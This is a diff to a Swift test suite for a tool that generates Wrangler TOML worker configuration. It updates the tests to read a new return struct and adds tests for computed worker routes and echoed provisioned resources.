         #expect(toml.components(separatedBy: "name = \"POD\"").count == 2)
         #expect(toml.components(separatedBy: "binding = \"BLOBS\"").count == 2)
@@ -902,7 +902,7 @@ struct WorkerCompositionTests {
         let activitypub = worker(WorkerComposition.activitypubWorkerID, d1: false, kv: false, r2: false)
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [activitypub, solidPodWorker]
-        )
+        ).toml
         #expect(toml.contains("tag = \"v1\""))
         #expect(toml.contains("new_sqlite_classes = [\"ActivityPubObject\"]"))
         #expect(toml.contains("tag = \"v2\""))
@@ -911,7 +911,7 @@ struct WorkerCompositionTests {
 
     @Test("no solid-pod worker means no POD/BLOBS bindings or GC cron")
     func noSolidPodMeansNoBindings() throws {
-        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [indieauthWorker])
+        let toml = try WorkerComposition.generateWranglerToml(siteName: "my-site", workers: [indieauthWorker]).toml
         #expect(!toml.contains("SolidPodObject"))
         #expect(!toml.contains("BLOBS"))
         #expect(!toml.contains("*/5 * * * *"))
@@ -933,7 +933,7 @@ struct WorkerCompositionTests {
             siteName: "my-site",
             workers: [],
             experiments: [runningExperiment()]
-        )
+        ).toml
         #expect(toml.contains("main = \"worker/worker.ts\""))
         #expect(toml.contains("binding = \"ASSETS\""))
         #expect(toml.contains(#"run_worker_first = ["/", "/contact/thanks/"]"#))
@@ -949,7 +949,7 @@ struct WorkerCompositionTests {
             siteName: "my-site",
             workers: [],
             experiments: [runningExperiment(status: "draft")]
-        )
+        ).toml
         #expect(!toml.contains("main ="))
         #expect(!toml.contains("[[d1_databases]]"))
         #expect(!toml.contains("run_worker_first"))
@@ -961,7 +961,7 @@ struct WorkerCompositionTests {
             siteName: "my-site",
             workers: [],
             experiments: [runningExperiment(goalKind: "scroll", goalPath: nil)]
-        )
+        ).toml
         #expect(toml.contains(#"run_worker_first = ["/", "/x/goal"]"#))
     }
 
@@ -982,7 +982,7 @@ struct WorkerCompositionTests {
     func experimentPageRootAccepted() throws {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [], experiments: [runningExperiment(page: "/")]
-        )
+        ).toml
         #expect(toml.contains("run_worker_first"))
     }
 
@@ -999,7 +999,7 @@ struct WorkerCompositionTests {
             workers: [indieauthWorker],
             experiments: [runningExperiment()],
             projectRoot: "/workspace/site"
-        )
+        ).toml
         #expect(toml.contains("main = \"/workspace/site/worker/worker.ts\""))
         #expect(toml.contains("directory = \"/workspace/site/dist\""))
         let migrationsDirCount = toml.components(separatedBy: "migrations_dir = \"/workspace/site/worker/migrations\"").count - 1
@@ -1013,7 +1013,7 @@ struct WorkerCompositionTests {
     func projectRootDefaultsToNilForDeployPath() throws {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [indieauthWorker], experiments: [runningExperiment()]
-        )
+        ).toml
         #expect(toml.contains("main = \"worker/worker.ts\""))
         #expect(toml.contains("directory = \"dist\""))
         #expect(toml.contains("migrations_dir = \"worker/migrations\""))
@@ -1023,8 +1023,25 @@ struct WorkerCompositionTests {
     func projectRootTrailingSlash() throws {
         let toml = try WorkerComposition.generateWranglerToml(
             siteName: "my-site", workers: [], mcpEnabled: true, projectRoot: "/workspace/site/"
-        )
+        ).toml
         #expect(toml.contains("main = \"/workspace/site/worker/worker.ts\""))
         #expect(!toml.contains("//worker/worker.ts"))
+    }
+
+    @Test("generateWranglerToml returns the computed run_worker_first route set")
+    func returnsEffectiveRoutes() throws {
+        let config = try WorkerComposition.generateWranglerToml(
+            siteName: "site", workers: [indieauthWorker],
+            routeClaims: [WorkerRouteClaim(path: "/token", match: .exact, methods: ["POST"], handler: "indieauth")])
+        #expect(config.effectiveRoutes.contains("/token"))
+        #expect(config.toml.contains("run_worker_first = [\"/token\"]"))
+    }
+
+    @Test("generateWranglerToml echoes the resources it was given")
+    func echoesResources() throws {
+        let resources = WorkerComposition.ProvisionedResources(d1DatabaseID: "abc-123")
+        let config = try WorkerComposition.generateWranglerToml(
+            siteName: "site", workers: [indieauthWorker], resources: resources)
+        #expect(config.resources == resources)
     }
 }
